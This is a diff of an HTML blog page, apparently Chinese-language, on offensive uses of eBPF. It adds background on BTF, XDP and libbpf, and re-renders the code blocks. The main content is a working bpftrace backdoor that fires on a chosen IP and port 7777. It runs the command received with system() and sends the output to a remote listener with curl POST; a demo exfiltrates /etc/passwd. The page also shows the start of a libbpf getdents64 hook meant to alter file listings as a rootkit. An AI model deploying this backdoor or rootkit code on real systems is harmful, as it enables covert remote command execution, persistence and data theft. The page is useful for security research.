@@ -1685,7 +1685,7 @@
 <div class="single__infos">
   <time class="single__info" title="Written At">📅&nbsp;Jan 1, 0001 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;7&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;12&nbsp;min read </span>
   
   <span class="single__info">
      &middot; 👀<span id="busuanzi_value_page_pv">...</span> views
@@ -1732,7 +1732,96 @@
 <li>将安全和检测工具混合</li>
 <li>一些BPF作为rootkit，一些用来容器逃逸</li>
 </ul>
-<h2 id="bpftrace-backdoor">bpftrace backdoor</h2>
+<h3 id="btf">BTF</h3>
+<p><a href="https://www.kernel.org/doc/html/latest/bpf/btf.html">BTF</a> 是 BPF CO-RE 的核心之一， 它是是一种与 DWARF 类似的调试信息，但</p>
+<ul>
+<li>更通用、表达更丰富，用于描述 C 程序的所有类型信息。</li>
+<li>更简单，空间效率更高（使用 <a href="https://facebookmicrosites.github.io/bpf/blog/2018/11/14/btf-enhancement.html">BTF 去重算法</a>）， 占用空间比 DWARF 低 100x。</li>
+</ul>
+<p>如今，让 Linux 内核在运行时（runtime）一直携带 BTF 信息是可行的， 只需在编译时指定 <code>CONFIG_DEBUG_INFO_BTF=y</code>。内核的 BTF 除了被内核自身使用， 现在还用于增强 BPF 校验器自身的能力 —— 某些能力甚至超越了一年之前我们的想象力所及（例如，已经有了直接读取内核内存的能力，不再需要通过 <code>bpf_probe_read()</code> 间接读取了）。</p>
+<p>更重要的是，内核已经将这个自描述的权威 BTF 信息（定义结构体的精确内存布局等信息） 通过 sysfs 暴露出来，在 <code>/sys/kernel/btf/vmlinux</code>。 下面的命令将生成一个与所有内核类型兼容的 C 头文件（通常称为 “vmlinux.h”）：</p>
+<pre tabindex="0"><code>$ bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h
+</code></pre><p>这里说的”所有“真的是“所有”：包括那些并未通过 kernel-devel package 导出的类型！</p>
+<p>有了 <code>vmlinux.h</code>，就无需再像通常的 BPF 程序那样 <code>#include &lt;linux/sched.h&gt;</code>、<code>#include &lt;linux/fs.h&gt;</code> 等等头文件， 现在只需要 <code>#include &quot;vmlinux.h&quot;</code>，也不用再安装 kernel-devel 了。</p>
+<p>不幸的是，BPF（以及 DWARF）并不记录 <code>#define</code> 宏，因此某些常用 的宏可能在 vmlinux.h 中是缺失的。但这些没有记录的宏中 ，最常见的一些已经在 <a href="https://github.com/libbpf/libbpf/blob/master/src/bpf_helpers.h">bpf_helpers.h</a> （libbpf 提供的内核侧”库“）提供了。</p>
+<h3 id="xdp">XDP</h3>
+<p>XDP全称为eXpress Data Path，是Linux内核网络栈的最底层。它只存在于RX路径上，允许在网络设备驱动内部网络堆栈中数据来源最早的地方进行数据包处理，在特定模式下可以在操作系统分配内存（skb）之前就已经完成处理。</p>
+<p>XDP暴露了一个可以加载BPF程序的网络钩子。在这个钩子中，程序能够对传入的数据包进行任意修改和快速决策，避免了内核内部处理带来的额外开销。这使得XDP在性能速度方面成为最佳钩子，例如缓解DDoS攻击等，相关背景知识可以看<a href="https://davidlovezoe.club/ebpf-learning-xdp-init-intro">这篇文章</a>。</p>
+<p>XDP暴露的钩子具有特定的输入上下文，它是单一输入参数。它的类型为 struct xdp_md，在内核头文件bpf.h 中定义，具体字段如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* user accessible metadata for XDP packet hook
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * new fields must be added to the end of this structure
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">xdp_md</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">data_end</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">data_meta</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* Below access go through struct xdp_rxq_info */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">ingress_ifindex</span><span class="p">;</span> <span class="cm">/* rxq-&gt;dev-&gt;ifindex */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">rx_queue_index</span><span class="p">;</span>  <span class="cm">/* rxq-&gt;queue_index  */</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>程序执行时，data和data_end字段分别是数据包开始和结束的指针，它们是用来获取和解析传来的数据，第三个值是data_meta指针，初始阶段它是一个空闲的内存地址，供XDP程序与其他层交换数据包元数据时使用。最后两个字段分别是接收数据包的接口和对应的RX队列的索引。当访问这两个值时，BPF代码会在内核内部重写，以访问实际持有这些值的内核结构struct xdp_rxq_info。</p>
+<p>在处理完一个数据包后，XDP程序会返回一个动作（Action）作为输出，它代表了程序退出后对数据包应该做什么样的最终裁决，也是在内核头文件bpf.h 定义了以下5种动作类型：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">enum</span> <span class="n">xdp_action</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">XDP_ABORTED</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="c1">// Drop packet while raising an exception
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">XDP_DROP</span><span class="p">,</span> <span class="c1">// Drop packet silently
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">XDP_PASS</span><span class="p">,</span> <span class="c1">// Allow further processing by the kernel stack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">XDP_TX</span><span class="p">,</span> <span class="c1">// Transmit from the interface it came from
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">XDP_REDIRECT</span><span class="p">,</span> <span class="c1">// Transmit packet from another interface
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/posts/offensive_bpf/image-20220621155731752.png" alt="image-20220621155731752" /></p>
+<h3 id="libbpf--libbpf-bootstrap">libbpf &amp;&amp; libbpf-bootstrap</h3>
+<p>libbpf是为快速构建bpf程序的一个库，与bcc类似，需要编写bpf程序和一个装载程序，对于编写tracepoint、kprobe、uprobe等来说比较便捷。</p>
+<p>bpf编写的xdp程序可以直接用命令挂在到网卡 不一定需要装载器，其中libbpf-boorstrap只提供了rust的写法（对于没有学过rust的同学不太友好），直接硬搬c写法的话是装载不上的。</p>
+<p>libbpf or libbpf-bootstrap的写法中常出现SEC(&ldquo;tracepoint/&hellip;&quot;)的写法，这只是代码段的命名，对于tracepoint、uprobe等会根据其挂在到对应的点上。但是对于SEC(&ldquo;xdp/.&quot;)，直接照抄libbpf-bootstrap的c写法会报错，可以采用编译后手动挂载的方法，如果会rust也可以参考库中rust写法，也可以参照<a href="https://github.com/xdp-project/xdp-tutorial">xdp-tutorial</a>的写法。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">clang -O2 -target bpf -c xdp-drop.c -o xdp-drop.o -I /usr/include/x86_64-linux-gnu
+</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> dev docker0 xdp obj xdp-drop.o sec xdp verbose
+</span></span><span class="line"><span class="cl">sudo ip link list
+</span></span><span class="line"><span class="cl">docker run -d -p 80:80 nginx
+</span></span><span class="line"><span class="cl">curl 127.0.0.1
+</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> dev docker0 xdp off
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="bpftrace-backdoor">bpftrace backdoor</h2>
 <h3 id="validator">Validator</h3>
 <p>假设用户已经获取一个root shell，希望用bpf搭建隐藏性更好的后门。</p>
 <p>可以使用远程IP地址和TCP连接的源端口号的组合来触发BPF程序。</p>
@@ -1927,52 +2016,103 @@ kretprobe:inet_csk_accept
 <p>最终代码如下，因为要找到sock然后匹配地址 所以不全是tracepoint 用了一个kprobe，不是很优雅</p>
 <p>一个注意点是数组可以嵌套多维，用来表示条件和存储变量比较优雅</p>
 <p>还有一个注意点是各个trace之间的条件关系 否则会输出无关数据或者无法输出需要的数据 因为前面收到的变量记录为指针到下一个trace很可能数据已经被改变</p>
-<pre tabindex="0"><code class="language-bpftrace" data-lang="bpftrace">#include &lt;net/sock.h&gt;
-#include &lt;linux/in.h&gt;
-#include &lt;linux/socket.h&gt;
-
-BEGIN
-{
-    printf(&#34;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&#34;);
-}
-
-tracepoint:syscalls:sys_exit_accept*
-{
-    @fd[tid] = args-&gt;ret;
-}
-
-kprobe:sock_recvmsg
-/ @fd[tid] /
-{
-    @socks[@fd[tid]] = (struct socket *)arg0;
-}
-
-tracepoint:syscalls:sys_enter_recvfrom
-/ @fd[tid] /
-{
-    printf(&#34;-&gt;sys_enter_read for allowed thread (fd: %d)\n&#34;, args-&gt;fd);
-    @sys_read[tid] = args-&gt;ubuf;
-}
-
-tracepoint:syscalls:sys_exit_recvfrom
-/ @socks[@fd[tid]] /
-{
-	$sock = @socks[@fd[tid]];
-	$dport_tmp = (uint16)$sock-&gt;sk-&gt;__sk_common.skc_dport;
-	$dport = (( $dport_tmp  &gt;&gt; 8) | (( $dport_tmp &lt;&lt; 8) &amp; 0x00FF00));
-    printf(&#34;addr:%s port:%d\n&#34;, ntop($sock-&gt;sk-&gt;__sk_common.skc_daddr), $dport);
-
-    if ($dport == 7777 &amp;&amp; $sock-&gt;sk-&gt;__sk_common.skc_daddr == 2156439744)
-    {
-        $len = args-&gt;ret;
-        $cmd = str(@sys_read[tid], $len);
-        printf(&#34;Command: %s\n&#34;, $cmd);
-        system(&#34;%s&#34;, $cmd);
-        system(&#34;curl -X POST --data-binary @/tmp/o %s&#34;, str($1));
-        system(&#34;rm -f /tmp/o&#34;);
-    }
-}
-</code></pre><p>运行结果如下图：两个linux shell 两个windows powershell。其中powershell监听发过来的数据，linux挂载backdoor，后台启动一个nginx端口映射到80端口，开另一个linux shell使用nc指定7777端口去访问本机的80端口发送命令触发后门，因为符合代码中检测的来源ip和端口所以成功触发执行cat /etc/passwd并发送到远程windows监听处；再次使用win主机尝试连接靶机，由于目标ip不符合条件，所以没能触发后门。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;net/sock.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/in.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/socket.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="n">BEGIN</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to Offensive BPF... Use Ctrl-C to exit.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">tracepoint</span><span class="p">:</span><span class="nl">syscalls</span><span class="p">:</span><span class="n">sys_exit_accept</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">kprobe</span><span class="p">:</span><span class="n">sock_recvmsg</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span> <span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">socks</span><span class="p">[</span><span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">socket</span> <span class="o">*</span><span class="p">)</span><span class="n">arg0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">tracepoint</span><span class="p">:</span><span class="nl">syscalls</span><span class="p">:</span><span class="n">sys_enter_recvfrom</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span> <span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;-&gt;sys_enter_read for allowed thread (fd: %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">sys_read</span><span class="p">[</span><span class="n">tid</span><span class="p">]</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">ubuf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">tracepoint</span><span class="p">:</span><span class="nl">syscalls</span><span class="p">:</span><span class="n">sys_exit_recvfrom</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span> <span class="err">@</span><span class="n">socks</span><span class="p">[</span><span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]]</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">sock</span> <span class="o">=</span> <span class="err">@</span><span class="n">socks</span><span class="p">[</span><span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">dport_tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint16</span><span class="p">)</span><span class="err">$</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">__sk_common</span><span class="p">.</span><span class="n">skc_dport</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">dport</span> <span class="o">=</span> <span class="p">((</span> <span class="err">$</span><span class="n">dport_tmp</span>  <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span> <span class="err">$</span><span class="n">dport_tmp</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x00FF00</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;addr:%s port:%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ntop</span><span class="p">(</span><span class="err">$</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">__sk_common</span><span class="p">.</span><span class="n">skc_daddr</span><span class="p">),</span> <span class="err">$</span><span class="n">dport</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">dport</span> <span class="o">==</span> <span class="mi">7777</span> <span class="o">&amp;&amp;</span> <span class="err">$</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">__sk_common</span><span class="p">.</span><span class="n">skc_daddr</span> <span class="o">==</span> <span class="mi">2156439744</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">len</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">str</span><span class="p">(</span><span class="err">@</span><span class="n">sys_read</span><span class="p">[</span><span class="n">tid</span><span class="p">],</span> <span class="err">$</span><span class="n">len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Command: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="err">$</span><span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="err">$</span><span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;curl -X POST --data-binary @/tmp/o %s&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="err">$</span><span class="mi">1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;rm -f /tmp/o&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行结果如下图：两个linux shell 两个windows powershell。其中powershell监听发过来的数据，linux挂载backdoor，后台启动一个nginx端口映射到80端口，开另一个linux shell使用nc指定7777端口去访问本机的80端口发送命令触发后门，因为符合代码中检测的来源ip和端口所以成功触发执行cat /etc/passwd并发送到远程windows监听处；再次使用win主机尝试连接靶机，由于目标ip不符合条件，所以没能触发后门。</p>
 <p><img src="/images/posts/offensive_bpf/image-20220617234118729.png" alt="image-20220617234118729" /></p>
 <h2 id="malicious-bpf">Malicious bpf</h2>
 <p>如果要在BPF执行期间修改数据结构可以使用bpf_probe_write_user，但是这在bpftrace中似乎不可用，所以还得看C</p>
@@ -1989,7 +2129,9 @@ tracepoint:syscalls:sys_exit_recvfrom
 <p>要多做的步骤其实和bcc与bpftrace的差别大致相同 需要添加映射并且添加trace point</p>
 <p>使用bpftrace映射，其中只需要简单的变量名—不需要其他任何东西。在libbpf中，必须定义保存数据的结构，并使用bpf_helper函数来更新或删除值</p>
 <h3 id="修改文件名">修改文件名</h3>
-<p>要修改文件名需要hook sys_exit_getdents64，可以通过bpftrace获取参数</p>
+<p>程序基于<a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a>搭建，bootstrap演示了BPF全局变量的使用(Linux 5.5+)和BPF环缓冲区的使用(Linux 5.8+)</p>
+<p>bootstrap.c是用户态加载器 bootstrap.bpf.c是bpf代码 bootstrap.h是头文件 vmlinux.h提供内核系统调用等信息</p>
+<p>通过strace可以查看系统调用 要修改文件名需要hook sys_exit_getdents64，可以通过bpftrace获取参数 其中/sys/kernel/btf/vmlinux文件是否存在表示是否开启BTF</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2017,22 +2159,43 @@ tracepoint:syscalls:sys_exit_recvfrom
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>编写如下代码 目的是获取数据并向d_entry中填充值 以便sys_exit_getdents64访问</p>
-<pre tabindex="0"><code class="language-bpf" data-lang="bpf">SEC(&#34;tracepoint/syscalls/sys_enter_getdents64&#34;)
-int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
-{
-    tid_t tid = bpf_get_current_pid_tgid();
-
-    struct linux_dirent64 *d_entry = (struct linux_dirent64 *) ctx-&gt;args[1]; 
-    if (d_entry == NULL)
-    {
-        return 0;
-    }
-
-    bpf_map_update_elem(&amp;dir_entries, &amp;tid, &amp;d_entry, BPF_ANY);
-    
-    return 0;
-}
-</code></pre><p>相比起来获取变量 bpftrace就方便很多</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">SEC</span><span class="p">(</span><span class="s">&#34;tracepoint/syscalls/sys_enter_getdents64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">handle_enter_getdents64</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tid_t</span> <span class="n">tid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">linux_dirent64</span> <span class="o">*</span><span class="n">d_entry</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">linux_dirent64</span> <span class="o">*</span><span class="p">)</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">d_entry</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_entries</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d_entry</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>相比起来获取变量 bpftrace就方便很多</p>
 <pre tabindex="0"><code class="language-bpftrace" data-lang="bpftrace">tracepoint:syscalls:sys_enter_getdents64
 {  
   @dir_entries[tid] = args-&gt;dirent;
@@ -2042,7 +2205,189 @@ int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
 <p>迭代次数限制在256次</p>
 <p>通过使用bpf_printk进行调试打印 <code>sudo cat /sys/kernel/debug/tracing/trace_pipe</code>获取输出</p>
 <p>可以通过<code>d_type</code> 不等于 <code>DT_DIR</code> (4)来跳过目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">SEC</span><span class="p">(</span><span class="s">&#34;tracepoint/syscalls/sys_exit_getdents64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">handle_exit_getdents64</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_exit</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">event</span>       <span class="o">*</span><span class="n">e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">task</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="p">)</span><span class="n">bpf_get_current_task</span><span class="p">();</span>
